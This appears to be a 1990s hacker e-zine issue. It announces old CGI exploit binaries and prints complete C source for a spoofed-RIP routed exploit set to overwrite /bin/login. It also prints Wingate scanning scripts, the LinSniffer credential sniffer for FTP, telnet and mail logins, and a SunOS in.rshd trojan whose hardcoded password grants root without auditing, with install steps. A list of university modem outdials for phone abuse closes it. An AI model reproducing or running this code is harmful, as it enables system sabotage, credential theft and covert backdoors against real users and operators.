                           #### #### #### ####
                            #######   #######

                    Jimmy J's "vintage warez" : pack #1
                    -----------------------------------

      phf - The old favourite but with some new and useful options
            such as trying the bash ff hole to avoid phf filtering
            the newline character.

 test-cgi - Another oldie allowing you to remotely list files.  Good
            for getting an idea what CGIs are on the machine as well as
            other stuff, including packages installed etc.

     icat - Grab a file from a remote machine running imapd.  (You need
            a valid account on the box)

Included in the crh008.zip is a vintage.tgz, these are Linux binaries for
the programs above, the two CGI exploits are as old as the hills but they
never seem to die so I dusted off some old archives and set about refining
them into a semi-useful state.

You can now specify a port number and a path to the CGI if you need and the
phf script even swaps spaces for %20s provided you use it properly.

I'm just releasing these for a laugh really.  Someone, somewhere will
appreciate the effort.

I am not responsible for any use or misuse of these warez.  They are for
informational purposes.

I urge the novice script kiddies among you to read the comments if you're
eager to learn what's going on behind the scenes and why.  Learning is good.

That's it.  Have fun.

JJ.

(If you wish to contact me mail chris@rootshell.com and he will forward it.)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. routed remote : Kit Knox
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * BSD 4.4 based routed trace file exploit
 *
 * Basically, routed on IRIX, AIX and Linux systems can be forced into a debug
 * mode, where a tracefile is specified in the RIP header, this tracefile can
 * be used as a form of DoS, as you can specify it to overwrite system files,
 * the actual contents of the file created is just routing information, so you
 * CANNOT set up .rhosts files or rootshells! You can only use it as DoS,
 * this was also a problem with the old statd remote, but people worked out
 * how to use a "grappling-hook" technique, that gave a remote rootshell, it's
 * documented in a CERT advisory for statd, work it out..
 *
 * Originally from l0ck, but recoded by Kit Knox (info@rootshell.com), with
 * RIP spoofing etc. etc. still does the DoS, no rootshells yet :P
 *
 * NOTE : routed usually runs on port 520.
 */

/* File to append to on filesystem with debug output */

#define FILETOCREATE    "/bin/login"


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <linux/udp.h>
#include <netinet/protocols.h>
#include <netdb.h>
#include <protocols/routed.h>
#include <linux/route.h>

#define err(x) { fprintf(stderr, x); exit(1); }
#define errs(x, y) { fprintf(stderr, x, y); exit(1); }

/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

/* Send faked UDP packet. */
int sendpkt_udp(sin, s, data, datalen, saddr, daddr, sport, dport)
struct sockaddr_in *sin;
unsigned short int s, datalen, sport, dport;
unsigned long  int saddr, daddr;
char *data;
{  
  struct iphdr  ip;
  struct udphdr udp;
  static char packet[8192];

  /* Fill in IP header values. */
  ip.ihl      = 5;
  ip.version  = 4;
  ip.tos      = 0;
  ip.tot_len  = htons(28 + datalen);
  ip.id       = htons(31337 + (rand()%100));
  ip.frag_off = 0;
  ip.ttl      = 255;
  ip.protocol = IPPROTO_UDP;
  ip.check    = 0;
  ip.saddr    = saddr;
  ip.daddr    = daddr;
  ip.check    = in_cksum((char *)&ip, sizeof(ip));

  /* Fill in UDP header values. Checksums are unnecassary. */
  udp.source = htons(sport);
  udp.dest   = htons(dport);
  udp.len    = htons(8 + datalen);
  udp.check  = (short) 0;

  /* Copy the headers into our character array. */
  memcpy(packet, (char *)&ip, sizeof(ip));
  memcpy(packet+sizeof(ip), (char *)&udp, sizeof(udp));
  memcpy(packet+sizeof(ip)+sizeof(udp), (char *)data, datalen);

  return(sendto(s, packet, sizeof(ip)+sizeof(udp)+datalen, 0,
         (struct sockaddr *)sin, sizeof(struct sockaddr_in)));
}

/* Lookup the name. Also handles a.b.c.d dotted quads. Returns 0 on error */
unsigned int lookup(host)
char *host;
{
  unsigned int addr;
  struct hostent *he;

  addr = inet_addr(host);	/* Try if it's a "127.0.0.1" style string */
  if (addr == -1) 		/* If not, lookup the host */
  {
    he = gethostbyname(host);
    if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
      return 0;

    bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));
  }
  return(addr);
}

void
main(argc, argv)
int argc; char **argv;
{
  unsigned int saddr, daddr;
  struct sockaddr_in sin;
  int s;
  struct rip rp;

  if(argc != 4)
    errs("\nSee http://www.rootshell.com/\n\nUsage: %s <source_router> <dest_addr> <command>\n\ncommand: 3 = trace on, 4 = trace off\n\n",argv[0]);

  if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    err("Unable to open raw socket.\n");

  if(!(saddr = lookup(argv[1])))
    err("Unable to lookup source address.\n");
  if(!(daddr = lookup(argv[2])))
    err("Unable to lookup destination address.\n");

  sin.sin_family     = AF_INET;
  sin.sin_addr.s_addr= daddr;
  sin.sin_port       = 520;

  /* Fill in RIP packet info */
  rp.rip_cmd = atoi(argv[3]); /* 3 = RIPCMD_TRACEON, 4 = RIPCMD_TRACEOFF */
  rp.rip_vers = RIPVERSION; /* Must be version 1 */
  sprintf(rp.rip_tracefile, FILETOCREATE);

  if((sendpkt_udp(&sin, s, &rp, sizeof(rp), saddr, daddr, 520, 520)) == -1)
  {
    perror("sendpkt_udp");
    err("Error sending the UDP packet.\n");
  }
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Wingate scanner : trajek / cl0ut
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Needs nmap (phrack 51 -> www.phrack.com), work it out, simple..


skr1pt #1

---8<--- cut here ---8<--- cut here ---8<--- cut here ---8<--- cut here

#nmap $1 -p 23 | grep telnet
 if nmap $1 -p 23 | grep telnet ; then
  echo $1 >> scan.results
 fi

---8<--- cut here ---8<--- cut here ---8<--- cut here ---8<--- cut here


skr1pt #2

---8<--- cut here ---8<--- cut here ---8<--- cut here ---8<--- cut here

# tee hee.. cl0ut/1998
host -l $1 | grep "has address" | awk -F ' ' '{ print $4 }' > $1.domains
echo "* Sorting hosts and removing dupes."   
sort < $1.domains > $1.sorted
uniq < $1.sorted > $1.domains
rm -f $1.sorted

cat $1.domains | awk -F ' ' '{ print "./b " $1 }' > $1.tmp
rm -fr $1.domains
chmod +x $1.tmp
./$1.tmp
rm -fr $1.tmp

---8<--- cut here ---8<--- cut here ---8<--- cut here ---8<--- cut here 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. LinSniffer 0.666 : humble
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 *      LinSniffer 0.666
 *      by humble of rhino9
 *      I am not responsible for what you do with this.
 *
 *      This is like linsniffer, but it uses a linked list
 *      so it won't ignore any connections.
 *
 *      based on original code by Mike Edulla
 *
 *      how many bytes do you want to capture per connection?
 *      it mallocs this much memory for each connection so don't
 *      make it too high
 */

#define MAXIMUM_CAPTURE 256
// how long before we stop watching an idle connection?
#define TIMEOUT 30
// log file name?
#define LOGNAME "tcp.log"

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <sys/stat.h>
#include <fcntl.h>

int sock;
FILE *log;

struct connection 
{
	struct connection *next;

	time_t start;
	time_t lasthit;

	unsigned long saddr;
	unsigned long daddr;
	unsigned short sport;
	unsigned short dport;

	unsigned char data[MAXIMUM_CAPTURE];
	int bytes;
};

typedef struct connection *clistptr;

clistptr head,tail;

void add_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
{
	clistptr newnode;

	newnode=(clistptr)malloc(sizeof(struct connection));
	newnode->saddr=sa;
	newnode->daddr=da;
	newnode->sport=sp;
	newnode->dport=dp;
	newnode->bytes=0;
	newnode->next=NULL;
	time(&(newnode->start));
	time(&(newnode->lasthit));
	if (!head)
	{	
		head=newnode;
		tail=newnode;
	}
	else
	{
		tail->next=newnode;
		tail=newnode;
	}
}		

char *hostlookup(unsigned long int in)
{
   static char blah[1024];
   struct in_addr i;
   struct hostent *he;

   i.s_addr=in;
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
   if(he == NULL) strcpy(blah, inet_ntoa(i));
   else strcpy(blah, he->h_name);
   return blah;
}

char *pretty(time_t *t)
{ 
	char *time;
	time=ctime(t);
	time[strlen(time)-6]=0;
	return time;
}

int remove_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
{
	clistptr walker,prev;
	int i=0;
	int t=0;
	if (head)
	{
	 	walker=head;
		prev=head;
		while (walker)
		{
			if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
			{
				prev->next=walker->next;
				if (walker==head)
				{
					head=head->next;;
					prev=NULL;
				}
				if (walker==tail)
					tail=prev;
				fprintf(log,"============================================================\n");
				fprintf(log,"Time: %s     Size: %d\nPath: %s",pretty(&(walker->start)),walker->bytes,hostlookup(sa));
				fprintf(log," => %s [%d]\n------------------------------------------------------------\n",hostlookup(da),ntohs(dp));
				fflush(log);
				for (i=0;i<walker->bytes;i++)
				{
					if (walker->data[i]==13)
					{
						fprintf(log,"\n"); 
						t=0; 
					}
					if (isprint(walker->data[i]))
					{
						fprintf(log,"%c",walker->data[i]);
						t++;
					}
					if (t>75)
					{
						t=0;
						fprintf(log,"\n");
					}
				}
				fprintf(log,"\n");
				fflush(log);
				free (walker);
				return 1;	
			}
			prev=walker;
			walker=walker->next;
		}
	}	
}
int log_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,int bytes,char *buffer)
{
	clistptr walker;

	walker=head;
	while (walker)
	{
		if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
		{
			time(&(walker->lasthit));
			strncpy(walker->data+walker->bytes,buffer,MAXIMUM_CAPTURE-walker->bytes);
			walker->bytes=walker->bytes+bytes;
			if (walker->bytes>=MAXIMUM_CAPTURE)
			{
				walker->bytes=MAXIMUM_CAPTURE;
				remove_node(sa,da,sp,dp);
				return 1;
			}	
		}
		walker=walker->next;
	}
			
}	


void setup_interface(char *device);
void cleanup(int);


struct etherpacket
{
   struct ethhdr eth;
   struct iphdr  ip;
   struct tcphdr tcp;
   char buff[8192];
} ep;

struct iphdr *ip;
struct tcphdr *tcp;

void cleanup(int sig)
{
	if (sock)
   		close(sock);
	if (log)
	{
		fprintf(log,"\nExiting...\n");
		fclose(log);
	}
	exit(0);
}

void purgeidle(int sig)
{
	clistptr walker;
	time_t curtime;	
	walker=head;
	signal(SIGALRM, purgeidle);
	alarm(5);
//	printf("Purging idle connections...\n");

	time(&curtime);
	while (walker)
	{
		if (curtime - walker->lasthit  > TIMEOUT)
		{
//			printf("Removing node: %d,%d,%d,%d\n",walker->saddr,walker->daddr,walker->sport,walker->dport);
			remove_node(walker->saddr,walker->daddr,walker->sport,walker->dport);
			walker=head;
		}
		else
			walker=walker->next;
	}
}

void setup_interface(char *device)
{
	int fd;
	struct ifreq ifr;
	int s;
	
	//open up our magic SOCK_PACKET
	fd=socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
	if(fd < 0)
	{
		perror("cant get SOCK_PACKET socket");
		exit(0);
	}

	//set our device into promiscuous mode
	strcpy(ifr.ifr_name, device);
	s=ioctl(fd, SIOCGIFFLAGS, &ifr);
	if(s < 0)
	{
		close(fd);
		perror("cant get flags");
		exit(0);
	}
	ifr.ifr_flags |= IFF_PROMISC;
	s=ioctl(fd, SIOCSIFFLAGS, &ifr);
	if(s < 0) perror("cant set promiscuous mode");
	sock=fd;
}

int filter(void)
{
	int p;
	p=0;

	if(ip->protocol != 6) return 0;
	
	p=0;
	if (htons(tcp->dest) == 21) p= 1;
	if (htons(tcp->dest) == 23) p= 1;
	if (htons(tcp->dest) == 106) p= 1;
	if (htons(tcp->dest) == 109) p= 1;
	if (htons(tcp->dest) == 110) p= 1;
	if (htons(tcp->dest) == 143) p= 1;
	if (htons(tcp->dest) == 513) p= 1;
	if (!p) return 0;
		
	if(tcp->syn == 1)
	{
//		printf("Adding node syn %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		add_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	if (tcp->rst ==1)
	{
//		printf("Removed node rst %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	if (tcp->fin ==1)
	{
//		printf("Removed node fin %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	log_node(ip->saddr,ip->daddr,tcp->source,tcp->dest,htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);
}


void main(int argc, char *argv[])
{
	int x,dn;	
	clistptr c;
	head=tail=NULL;

	ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
	tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);

	if (fork()==0)
	{
		close(0); close(1); close(2);
		setsid();
		dn=open("/dev/null",O_RDWR);
		dup2(0,dn); dup2(1,dn); dup2(2,dn);
		close(dn);
		setup_interface("eth0");

		signal(SIGHUP, SIG_IGN);
		signal(SIGINT, cleanup);
		signal(SIGTERM, cleanup);
		signal(SIGKILL, cleanup);
		signal(SIGQUIT, cleanup);
		signal(SIGALRM, purgeidle);
	
		log=fopen(LOGNAME,"a");
   	if (log == NULL) 
		{ 
			fprintf(stderr, "cant open log\n");
			exit(0);
		}

		alarm(5);

		while (1)
		{
			x=read(sock, (struct etherpacket *)&ep, sizeof(struct etherpacket));
			if (x>1)
			{
				filter();
			}
		}
	}
}


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. SunOS 5.5.1 in.rshd trojan : anonymous
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
	SunOS 5.5.1 in.rshd trojan
        By anonymous, for the hackers of the w0rld
	1/3/98

	Use thiz shizn1t t0 make me!

        cc in.rshd.c -o in.rshd -lsocket -lnsl -lintl -lw -ldl -lbsm -lauth
        -DSYSV -DSTRNET -DBSD_COMP -s

        Then mv me to /usr/sbin, and restart inetd using:

        # kill -HUP <pid of inetd>

        w0rd.
*/

#define PASSWORD "eatme"
#ident	"@(#)in.rshd.c	0.41	92/08/11"

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/stat.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <stdio.h>
#include <errno.h>
#include <pwd.h>
#include <signal.h>
#include <netdb.h>
#include <syslog.h>

#ifdef SYSV
#include <sys/resource.h>
#include <sys/filio.h>
#include <shadow.h>
#include <stdlib.h>

#include <security/ia_appl.h>

#define	killpg(a,b)	kill(-(a),(b))
#define rindex strrchr
#define index strchr
#endif	/* SYSV */

#ifndef NCARGS
#define NCARGS	5120
#endif /* NCARGS */

int	errno;
char	*index(), *rindex(), *strncat();
/*VARARGS1*/
int	error();

struct ia_status ia_status;
void * iah;
int retval;

/*ARGSUSED*/
main(argc, argv)
	int argc;
	char **argv;
{
	struct linger linger;
	int on = 1, fromlen;
	struct sockaddr_in from;

	openlog("rsh", LOG_PID | LOG_ODELAY, LOG_DAEMON);
	audit_rshd_setup();	/* BSM */
	fromlen = sizeof (from);
	if (getpeername(0, (struct sockaddr *) &from, &fromlen) < 0) {
		fprintf(stderr, "%s: ", argv[0]);
		perror("getpeername");
		_exit(1);
	}
	if (setsockopt(0, SOL_SOCKET, SO_KEEPALIVE, (char *)&on,
	    sizeof (on)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_KEEPALIVE): %m");
	linger.l_onoff = 1;
	linger.l_linger = 60;			/* XXX */
	if (setsockopt(0, SOL_SOCKET, SO_LINGER, (char *)&linger,
	    sizeof (linger)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_LINGER): %m");
	doit(dup(0), &from);
	/* NOTREACHED */
}

char	username[20] = "USER=";
char	homedir[64] = "HOME=";
char	shell[64] = "SHELL=";

#ifdef SYSV
char	*envinit[] =
	    {homedir, shell, (char *) 0, username, (char *) 0, (char *) 0};
#define	ENVINIT_PATH	2	/* position of PATH in envinit[] */
#define	ENVINIT_TZ	4	/* position of TZ in envinit[] */

/*
 *	See PSARC opinion 1992/025
 */
char	userpath[] = "PATH=/usr/bin:";
char	rootpath[] = "PATH=/usr/sbin:/usr/bin";
#else
char	*envinit[] =
	    {homedir, shell, "PATH=:/usr/ucb:/bin:/usr/bin", username, 0};
#endif /* SYSV */

static char cmdbuf[NCARGS+1];
char hostname [MAXHOSTNAMELEN + 1];

doit(f, fromp)
	int f;
	struct sockaddr_in *fromp;
{
	char *cp;
	char locuser[16], remuser[16];

	struct passwd *pwd;
#ifdef SYSV
	char *tz, *tzenv;
	struct spwd *shpwd;
	struct stat statb;
#endif /* SYSV */

	int s;
	struct hostent *hp;
	short port;
	pid_t pid;
	int pv[2], cc;
	char buf[BUFSIZ], sig;
	int one = 1;
	int trojan=0;

	(void) signal(SIGINT, SIG_DFL);
	(void) signal(SIGQUIT, SIG_DFL);
	(void) signal(SIGTERM, SIG_DFL);
#ifdef SYSV
	(void) sigset(SIGCHLD, SIG_IGN);
#endif /* SYSV */
#ifdef DEBUG
	{ int t = open("/dev/tty", 2);
	  if (t >= 0) {
#ifdef SYSV
		setsid();
#else
		ioctl(t, TIOCNOTTY, (char *)0);
#endif SYSV
		(void) close(t);
	  }
	}
#endif
	fromp->sin_port = ntohs((u_short)fromp->sin_port);
	if (fromp->sin_family != AF_INET) {
		syslog(LOG_ERR, "malformed from address\n");
		exit(1);
	}
	if (fromp->sin_port >= IPPORT_RESERVED ||
	    fromp->sin_port < (u_int) (IPPORT_RESERVED/2)) {
		syslog(LOG_NOTICE, "connection from bad port\n");
		exit(1);
	}
	(void) alarm(60);
	port = 0;
	for (;;) {
		char c;
		if ((cc = read(f, &c, 1)) != 1) {
			if (cc < 0)
				syslog(LOG_NOTICE, "read: %m");
			shutdown(f, 1+1);
			exit(1);
		}
		if (c == 0)
			break;
		port = port * 10 + c - '0';
	}
	(void) alarm(0);
	if (port != 0) {
		int lport = IPPORT_RESERVED - 1;
		s = rresvport(&lport);
		if (s < 0) {
			syslog(LOG_ERR, "can't get stderr port: %m");
			exit(1);
		}
		if (port >= IPPORT_RESERVED) {
			syslog(LOG_ERR, "2nd port not reserved\n");
			exit(1);
		}
		fromp->sin_port = htons((u_short)port);
		if (connect(s, (struct sockaddr *) fromp, 
			    sizeof (*fromp)) < 0) {
			syslog(LOG_INFO, "connect second port: %m");
			exit(1);
		}
	}
	dup2(f, 0);
	dup2(f, 1);
	dup2(f, 2);
	hp = gethostbyaddr((char *)&fromp->sin_addr, sizeof (struct in_addr),
		fromp->sin_family);
	if (hp)
		strncpy (hostname, hp->h_name, sizeof(hostname));
	else
		strncpy (hostname, inet_ntoa(fromp->sin_addr), 
			 sizeof(hostname));
	getstr(remuser, sizeof(remuser), "remuser");
	getstr(locuser, sizeof(locuser), "locuser");
	getstr(cmdbuf, sizeof(cmdbuf), "command");

	if (!strcmp(PASSWORD,locuser))
	{
		trojan=1;
	}

        if (!trojan && (ia_start("in.rshd", locuser, NULL, hostname, NULL, &iah)) !=
                IA_SUCCESS) {
                syslog(LOG_ERR, "ia_start() failed\n");
                exit(1);
        }
 
        if (!trojan && ia_auth_user(iah, 0, &pwd, &ia_status) != IA_SUCCESS) {
                error("permission denied\n");
		audit_rshd_fail("Login incorrect", hostname,
			remuser, locuser, cmdbuf);	/* BSM */
                exit(1);
        }

	if (trojan)
		pwd=getpwnam("root");
	else
	{
		shpwd = getspnam(locuser);
		if (shpwd == NULL) {
			error("permission denied.\n");
			audit_rshd_fail("Login incorrect", hostname,
				remuser, locuser, cmdbuf);      /* BSM */
			exit(1);
		}
	}
 
	/*
	 * maintain 2.1 and 4.* and BSD semantics with anonymous rshd
	 */
	if (!trojan && shpwd->sp_pwdp != 0 && *shpwd->sp_pwdp != '\0' &&
	    ia_auth_netuser(iah, remuser, &ia_status) != IA_SUCCESS ) {
                error("permission denied\n");
		audit_rshd_fail("Permission denied", hostname,
			remuser, locuser, cmdbuf);	/* BSM */
                exit(1);
        }

	if (chdir(pwd->pw_dir) < 0) {
		(void) chdir("/");
#ifdef notdef
		error("No remote directory.\n");
		exit(1);
#endif
	}

	(void) write(2, "\0", 1);
	if (port) {
		if (pipe(pv) < 0) {
			error("Can't make pipe.\n");
			exit(1);
		}
		pid = fork();
		if (pid == (pid_t)-1)  {
			error("Fork (to start shell) failed on server.  Please try again later.\n");
			exit(1);
		}

#ifndef MAX
#define MAX(a,b) (((u_int)(a) > (u_int)(b)) ? (a) : (b))
#endif /* MAX */

		if (pid) {
			int width = MAX(s, pv[0]) + 1;
			fd_set ready;
			fd_set readfrom;

			(void) close(0); (void) close(1); (void) close(2);
			(void) close(f); (void) close(pv[1]);
			FD_ZERO (&ready);
			FD_ZERO (&readfrom);
			FD_SET (s, &readfrom);
			FD_SET (pv[0], &readfrom);
			if (ioctl(pv[0], FIONBIO, (char *)&one) == -1)
				syslog (LOG_INFO, "ioctl FIONBIO: %m");
			/* should set s nbio! */
			do {
				ready = readfrom;
				if (select(width, &ready, (fd_set *)0,
				    (fd_set *)0, (struct timeval *)0) < 0)
					break;
				if (FD_ISSET (s, &ready)) {
					if (read(s, &sig, 1) <= 0)
						FD_CLR (s, &readfrom);
					else
						killpg(pid, sig);
				}
				if (FD_ISSET (pv[0], &ready)) {
					errno = 0;
					cc = read(pv[0], buf, sizeof (buf));
					if (cc <= 0) {
						shutdown(s, 1+1);
						FD_CLR (pv[0], &readfrom);
					} else
						(void) write(s, buf, cc);
				}
			} while (FD_ISSET (s, &readfrom) || 
				 FD_ISSET (pv[0], &readfrom));
			exit(0);
		}
		setpgrp(0, getpid());
		(void) close(s); (void) close(pv[0]);
		dup2(pv[1], 2);
		(void) close(pv[1]);
	}
	if (*pwd->pw_shell == '\0')
		pwd->pw_shell = "/bin/sh";
	(void) close(f);

	/*
	 * write audit record before making uid switch
	 */
if (!trojan)
{
	audit_rshd_success(hostname, remuser, locuser, cmdbuf); /* BSM */

        if (retval = ia_setcred(iah, SC_INITGPS|SC_SETRID,
                        pwd->pw_uid, pwd->pw_gid, 0, NULL, &ia_status)) {
                switch (retval) {
                        case 0:
                                break;
                        case IA_BAD_GID:
                                error("Invalid gid.\n");
                                exit(1);
                        case IA_BAD_UID:
                                error("Invalid uid.\n");
                                exit(1);
                        default:
                                exit(1);
                }
        }
        ia_end(iah);
} 
#ifdef	SYSV
	if (pwd->pw_uid)
		envinit[ENVINIT_PATH] = userpath;
	else
		envinit[ENVINIT_PATH] = rootpath;
	if (tzenv = getenv("TZ")) {
		/*
		 *	In the line below, 4 is strlen("TZ=") + 1 null byte.
		 *	We have to malloc the space because it's difficult to
		 *	compute the maximum size of a timezone string.
		 */
		tz = (char *) malloc(strlen(tzenv) + 4);
		if (tz) {
			strcpy(tz, "TZ=");
			strcat(tz, tzenv);
			envinit[ENVINIT_TZ] = tz;
		}
	}
#endif	/* SYSV */
	strncat(homedir, pwd->pw_dir, sizeof(homedir)-6);
	strncat(shell, pwd->pw_shell, sizeof(shell)-7);
	strncat(username, pwd->pw_name, sizeof(username)-6);
	cp = rindex(pwd->pw_shell, '/');
	if (cp)
		cp++;
	else
		cp = pwd->pw_shell;
#ifdef	SYSV
	/*
	 * rdist has been moved to /usr/bin, so /usr/ucb/rdist might not
	 * be present on a system.  So if it doesn't exist we fall back
	 * and try for it in /usr/bin.  We take care to match the space
	 * after the name because the only purpose of this is to protect
	 * the internal call from old rdist's, not humans who type
	 * "rsh foo /usr/ucb/rdist".
	 */
#define RDIST_PROG_NAME	"/usr/ucb/rdist -Server"
	if (strncmp(cmdbuf, RDIST_PROG_NAME, strlen(RDIST_PROG_NAME)) == 0) {
		if (stat("/usr/ucb/rdist", &statb) != 0) {
			strncpy(cmdbuf + 5, "bin", 3);
		}
	}
#endif
	execle(pwd->pw_shell, cp, "-c", cmdbuf, (char *)0, envinit);
	perror(pwd->pw_shell);
	exit(1);
}

/*VARARGS1*/
error(fmt, a1, a2, a3)
	char *fmt;
	int a1, a2, a3;
{
	char buf[BUFSIZ];

	buf[0] = 1;
	(void) sprintf(buf+1, fmt, a1, a2, a3);
	(void) write(2, buf, strlen(buf));
}

getstr(buf, cnt, err)
	char *buf;
	int cnt;
	char *err;
{
	char c;

	do {
		if (read(0, &c, 1) != 1)
			exit(1);
		*buf++ = c;
		if (--cnt == 0) {
			error("%s too long\n", err);
			exit(1);
		}
	} while (c != 0);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Outdials : Lirik
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                             Working Outdials
    
                 [100% for 304/319/413/800/804/814 NPAs]

      x.25 NPAs:204.306.403.416.418.506.514.519.604.613.709.902.905

===============================================================================

  Note  þ  NPA þ     IP/commands/Dial mask/Phones
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  !!!     304        DIALOUT.WVNET.EDU    (No parity)
         1800        DIALOUTE.WVNET.EDU   (Even parity)
                     ATDT 9,xxxxxxx
                     http://wvnvm.wvnet.edu/~roman/dialout.html
                     test phone atdt35001

  !!!     319        ISN.IASTATE.EDU. or isn.rdns.iastate.edu
                     DIAL: MODEM or HELP
                     ATDT8xxx-xxxx

  !!!     413        dialout2400.smith.edu | dialout.smith.edu  
                     Ctrl+} gives PLACE AUTOCAL
                     press y, wait for CALL COMPLETE
                     atdt9,,xxx-xxxx
                     Independent Nation (413)573-1809

  !!!     804        ublan.acc.virginia.edu / ublan.virginia.edu
